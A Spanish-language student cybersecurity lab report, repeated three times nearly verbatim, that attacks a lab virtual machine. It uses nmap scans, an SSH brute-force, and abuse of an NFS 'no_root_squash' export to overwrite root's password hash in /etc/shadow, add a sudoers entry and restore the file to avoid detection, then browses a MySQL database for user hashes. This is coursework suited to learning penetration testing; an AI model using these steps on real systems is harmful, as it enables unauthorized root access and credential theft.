# Practica2
Memoria Practica 2 - Ciberseguridad

rango_red = 10.0.2.0/25
ip_atacante = 10.0.2.5
ip_atacado = 10.0.2.4

1. Averiguar direccion IP de una maquina
	Primero averiguamos el ip de nuestra máquina con el comando ip a.
	Una vez obtenemos nuestra ip, escaneamos en el rando de direcciones.

	nmap [rango_red] -sn	-> escanea las IPs de la red
	hostname -I		-> devuelve la IP de la maquina local

	s: scan, n: no escanea los puertos, I: IP

	Salida:
		Nmap scan report for [ip]
		Host is up ([tiempo_latencia]s latency)
		...

	La IP X.X.X.1 es el gateway y la IP mostrada con hostname es la local
	Si solo hay 3 salidas, la restante es la maquina atacada

2. Identificar los puertos TCP abiertos de la maquina

	nmap [ip] -sT	-> Escanea los puertos TCP abiertos

	T: TCP

	Salida:
		PORT	STATE	SERVICE
		21/tcp	open	ftp
		...	...	...

3. Identificar los puertos UDP más frecuentes abiertos de la maquina

	sudo nmap [ip] -sU --top-ports [top]

	U: UDP, top-ports: muestra el estado de los [top] puertos mas comunes	
	Salida:
		PORT	STATE	SERVICE
		53/udp	open	domain
		...	...	...

	Extra:
	
	sudo nmap [ip] -sU 	-> muestra solo los puertos UDP abiertos

4. Averiguar version de los servicios ejecutándose en los puertos

	nmap [ip] -sV -p [lista_puertos]	-> Para puertos TCP
	sudo nmap [ip] -sUV -p [lista_puertos]	-> Para puertos UDP

	V: Version, p: puerto

	Salida:
		PORT	STATE	SERVICE	VERSION
		22/tcp	open	ssh	OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
		...	...	...	...

5. Averiguar la version del sistema operativo instalado en la maquina

	sudo nmap [ip] -O

	O: Sistema Operativo

	Salida:
		Running: Linux 2.6.X
		OS CPE: cpe:/o:linux:linux_kernel:2.6
		OS details: Linux 2.6.9 - 2.6.33

6. Iniciar sesion en la maquina a traves de SSH

	1 - Intentar conseguir credenciales con fuerza bruta

	nmap --script ssh-brute [ip]

	Salida:
		Accounts:
			[nombre_usuario]:[contraseña] - Valid credentials

	2 - Conseguidas las credenciales, iniciar sesion en la maquina

	ssh [nombre_usuario]@[ip] // [contraseña]

	3 - Dentro, buscamos ficheros

	find / -type f -name [nombre_fichero] 2> /dev/null

		2> /dev/null	-> no imprime los errores

	4 - Ver permisos de fichero

	ls -l [ruta_fichero]

	5 - Si permiso de lectura, ver contenido de fichero

	cat [ruta_fichero]

	6 - Cambiar permisos

		0. Como tiene NFS activo, comprobar que se pueda montar
			el arbol de directorios y ver los permisos que
			aporta al cliente

		cat /etc/exports
		
		Si tiene activa la opcion "no_root_squash", esta
			permitiendo a cualquier cliente en modo root
			acceder a los ficheros como root en el server

		a. En local, crear un directorio donde montaremos la
			proyeccion del sistema nfs de la maquina atacada

		mkdir [ruta_directorio]

		b. En local, montar el sistema nfs en el directorio

		sudo mount -t nfs [ip]:/ [ruta_directorio]

		t: tipo de sistema de ficheros

		c. Hacer una copia del archivo "shadow" por seguridad

		sudo cp [dir]/etc/shadow ./shadow_copy

		d. Crear contraseña cifrada

		openssl passwd -1 [SALT] [contraseña_nueva]

		1: MD5 de 22 caracteres

		Salida:
			$1$[SALT_cifrado]$[contraseña_cifrada]

		e. Cambiar la contraseña de root en archivo shadow original

		f. Entrar como root en la maquina
		
		ssh root@[ip] // [contraseña_nueva]

		g. Añadir usuario "user" a fichero "sudoers"

		sudo visudo -> user ALL:(ALL) ALL

		h. Salir y restaurar el archivo "shadow" original copiado
			por si el usuario quisiera acceder a root. Si falla
			la contraseña, nos podrían pillar antes

		sudo cp ./shadow_copy [dir]/etc/shadow

		i. Entrar como "user" en la maquina y cambiar los permisos

		chmod [0-70-70-7] [fichero]


7 mysql
entramos con la cuenta con los permisos dentro del ssh
ssh admin@10.0.2.5
dentro simplemente hacemos mysql tikiwiki y ya estamos dentro del mysql
con el show tables vemos las tablas que hay dentro del mysql

Memoria Practica 2 - Ciberseguridad

rango_red = 10.0.2.0/25
ip_atacante = 10.0.2.5
ip_atacado = 10.0.2.4

1. Averiguar direccion IP de una maquina
	Primero averiguamos el ip de nuestra máquina con el comando ip a.
	Una vez obtenemos nuestra ip, escaneamos en el rando de direcciones.

	nmap [rango_red] -sn	-> escanea las IPs de la red
	hostname -I		-> devuelve la IP de la maquina local

	s: scan, n: no escanea los puertos, I: IP

	Salida:
		Nmap scan report for [ip]
		Host is up ([tiempo_latencia]s latency)
		...

	La IP X.X.X.1 es el gateway y la IP mostrada con hostname es la local
	Si solo hay 3 salidas, la restante es la maquina atacada

2. Identificar los puertos TCP abiertos de la maquina

	nmap [ip] -sT	-> Escanea los puertos TCP abiertos

	T: TCP

	Salida:
		PORT	STATE	SERVICE
		21/tcp	open	ftp
		...	...	...

3. Identificar los puertos UDP más frecuentes abiertos de la maquina

	sudo nmap [ip] -sU --top-ports [top]

	U: UDP, top-ports: muestra el estado de los [top] puertos mas comunes	
	Salida:
		PORT	STATE	SERVICE
		53/udp	open	domain
		...	...	...

	Extra:
	
	sudo nmap [ip] -sU 	-> muestra solo los puertos UDP abiertos

4. Averiguar version de los servicios ejecutándose en los puertos

	nmap [ip] -sV -p [lista_puertos]	-> Para puertos TCP
	sudo nmap [ip] -sUV -p [lista_puertos]	-> Para puertos UDP

	V: Version, p: puerto

	Salida:
		PORT	STATE	SERVICE	VERSION
		22/tcp	open	ssh	OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
		...	...	...	...

5. Averiguar la version del sistema operativo instalado en la maquina

	sudo nmap [ip] -O

	O: Sistema Operativo

	Salida:
		Running: Linux 2.6.X
		OS CPE: cpe:/o:linux:linux_kernel:2.6
		OS details: Linux 2.6.9 - 2.6.33

6. Iniciar sesion en la maquina a traves de SSH

	1 - Intentar conseguir credenciales con fuerza bruta

	nmap --script ssh-brute [ip]

	Salida:
		Accounts:
			[nombre_usuario]:[contraseña] - Valid credentials

	2 - Conseguidas las credenciales, iniciar sesion en la maquina

	ssh [nombre_usuario]@[ip] // [contraseña]

	3 - Dentro, buscamos ficheros

	find / -type f -name [nombre_fichero] 2> /dev/null

		2> /dev/null	-> no imprime los errores

	4 - Ver permisos de fichero

	ls -l [ruta_fichero]

	5 - Si permiso de lectura, ver contenido de fichero

	cat [ruta_fichero]

	6 - Cambiar permisos

		0. Como tiene NFS activo, comprobar que se pueda montar
			el arbol de directorios y ver los permisos que
			aporta al cliente

		cat /etc/exports
		
		Si tiene activa la opcion "no_root_squash", esta
			permitiendo a cualquier cliente en modo root
			acceder a los ficheros como root en el server

		a. En local, crear un directorio donde montaremos la
			proyeccion del sistema nfs de la maquina atacada

		mkdir [ruta_directorio]

		b. En local, montar el sistema nfs en el directorio

		sudo mount -t nfs [ip]:/ [ruta_directorio]

		t: tipo de sistema de ficheros

		c. Hacer una copia del archivo "shadow" por seguridad

		sudo cp [dir]/etc/shadow ./shadow_copy

		d. Crear contraseña cifrada

		openssl passwd -1 [SALT] [contraseña_nueva]

		1: MD5 de 22 caracteres

		Salida:
			$1$[SALT_cifrado]$[contraseña_cifrada]

		e. Cambiar la contraseña de root en archivo shadow original

		f. Entrar como root en la maquina
		
		ssh root@[ip] // [contraseña_nueva]

		g. Añadir usuario "user" a fichero "sudoers"

		sudo visudo -> user ALL:(ALL) ALL

		h. Salir y restaurar el archivo "shadow" original copiado
			por si el usuario quisiera acceder a root. Si falla
			la contraseña, nos podrían pillar antes

		sudo cp ./shadow_copy [dir]/etc/shadow

		i. Entrar como "user" en la maquina y cambiar los permisos

		chmod [0-70-70-7] [fichero]


7 mysql
entramos con la cuenta con los permisos dentro del ssh
ssh admin@10.0.2.5
dentro simplemente hacemos mysql tikiwiki y ya estamos dentro del mysql
con el show tables vemos las tablas que hay dentro del mysql

Memoria Practica 2 - Ciberseguridad

rango_red = 10.0.2.0/25
ip_atacante = 10.0.2.5
ip_atacado = 10.0.2.4

1. Averiguar direccion IP de una maquina
	Primero averiguamos el ip de nuestra máquina con el comando ip a.
	Una vez obtenemos nuestra ip, escaneamos en el rando de direcciones.

	nmap [rango_red] -sn	-> escanea las IPs de la red
	hostname -I		-> devuelve la IP de la maquina local

	s: scan, n: no escanea los puertos, I: IP

	Salida:
		Nmap scan report for [ip]
		Host is up ([tiempo_latencia]s latency)
		...

	La IP X.X.X.1 es el gateway y la IP mostrada con hostname es la local
	Si solo hay 3 salidas, la restante es la maquina atacada

2. Identificar los puertos TCP abiertos de la maquina

	nmap [ip] -sT	-> Escanea los puertos TCP abiertos

	T: TCP

	Salida:
		PORT	STATE	SERVICE
		21/tcp	open	ftp
		...	...	...

3. Identificar los puertos UDP más frecuentes abiertos de la maquina

	sudo nmap [ip] -sU --top-ports [top]

	U: UDP, top-ports: muestra el estado de los [top] puertos mas comunes	
	Salida:
		PORT	STATE	SERVICE
		53/udp	open	domain
		...	...	...

	Extra:
	
	sudo nmap [ip] -sU 	-> muestra solo los puertos UDP abiertos

4. Averiguar version de los servicios ejecutándose en los puertos

	nmap [ip] -sV -p [lista_puertos]	-> Para puertos TCP
	sudo nmap [ip] -sUV -p [lista_puertos]	-> Para puertos UDP

	V: Version, p: puerto

	Salida:
		PORT	STATE	SERVICE	VERSION
		22/tcp	open	ssh	OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
		...	...	...	...

5. Averiguar la version del sistema operativo instalado en la maquina

	sudo nmap [ip] -O

	O: Sistema Operativo

	Salida:
		Running: Linux 2.6.X
		OS CPE: cpe:/o:linux:linux_kernel:2.6
		OS details: Linux 2.6.9 - 2.6.33

6. Iniciar sesion en la maquina a traves de SSH

	1 - Intentar conseguir credenciales con fuerza bruta

	nmap --script ssh-brute [ip]

	Salida:
		Accounts:
			[nombre_usuario]:[contraseña] - Valid credentials

	2 - Conseguidas las credenciales, iniciar sesion en la maquina

	ssh [nombre_usuario]@[ip] // [contraseña]

	3 - Dentro, buscamos ficheros

	find / -type f -name [nombre_fichero] 2> /dev/null

		2> /dev/null	-> no imprime los errores

	4 - Ver permisos de fichero

	ls -l [ruta_fichero]

	5 - Si permiso de lectura, ver contenido de fichero

	cat [ruta_fichero]

	6 - Cambiar permisos

		0. Como tiene NFS activo, comprobar que se pueda montar
			el arbol de directorios y ver los permisos que
			aporta al cliente

		cat /etc/exports
		
		Si tiene activa la opcion "no_root_squash", esta
			permitiendo a cualquier cliente en modo root
			acceder a los ficheros como root en el server

		a. En local, crear un directorio donde montaremos la
			proyeccion del sistema nfs de la maquina atacada

		mkdir [ruta_directorio]

		b. En local, montar el sistema nfs en el directorio

		sudo mount -t nfs [ip]:/ [ruta_directorio]

		t: tipo de sistema de ficheros

		c. Hacer una copia del archivo "shadow" por seguridad

		sudo cp [dir]/etc/shadow ./shadow_copy

		d. Crear contraseña cifrada

		openssl passwd -1 [SALT] [contraseña_nueva]

		1: MD5 de 22 caracteres

		Salida:
			$1$[SALT_cifrado]$[contraseña_cifrada]

		e. Cambiar la contraseña de root en archivo shadow original

		f. Entrar como root en la maquina
		
		ssh root@[ip] // [contraseña_nueva]

		g. Añadir usuario "user" a fichero "sudoers"

		sudo visudo -> user ALL:(ALL) ALL

		h. Salir y restaurar el archivo "shadow" original copiado
			por si el usuario quisiera acceder a root. Si falla
			la contraseña, nos podrían pillar antes

		sudo cp ./shadow_copy [dir]/etc/shadow

		i. Entrar como "user" en la maquina y cambiar los permisos

		chmod [0-70-70-7] [fichero]


7 mysql
entramos con la cuenta con los permisos dentro del ssh
ssh admin@10.0.2.5
dentro simplemente hacemos mysql tikiwiki y ya estamos dentro del mysql
con el show tables vemos las tablas que hay dentro del mysql
Vemos todas las tablas
![image.png](./image.png)
Filtramos para ver solo las que contengan user en el name
![image-1.png](./image-1.png)
Ahora en las tablas sospechosas simplemente miramos cual de ellas es la que contiene el hash
![image-2.png](./image-2.png)
En la tabla users.users probamos hasta encontrar el admin
![image-3.png](./image-3.png)
